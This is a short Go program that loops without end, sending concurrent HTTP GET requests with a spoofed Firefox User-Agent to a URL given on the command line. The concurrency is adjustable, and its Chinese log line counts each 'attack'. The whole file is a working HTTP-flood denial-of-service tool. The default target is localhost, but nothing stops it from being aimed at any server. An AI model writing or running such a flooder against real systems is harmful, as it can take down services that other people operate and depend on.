package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"net/http"
)

// var t int
var t chan bool

func main() {
	n := flag.Int("n", 100, "并发数")
	url := flag.String("u", "http://127.0.0.1:81/", "url")
	// t1 := flag.Int("t", 100, "t")
	flag.Parse()
	t = make(chan bool, *n)
	// t = *t1
	fmt.Println("Hello, world")
	for i := 0; ; i++ {
		log.Println("第", i+1, "次攻击")
		t <- true
		go func() {
			request(*url)
		}()
	}
	// time.Sleep(time.Minute)
	// for {
	// 	time.Sleep(time.Hour)
	// }
}

func request(url string) {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	// 自定义Header
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0")

	resp, err := client.Do(req)
	if err != nil {
		<-t
		return
	}
	defer resp.Body.Close()
	defer func() {
		<-t
	}()
	time.Sleep(10 * time.Microsecond)
}
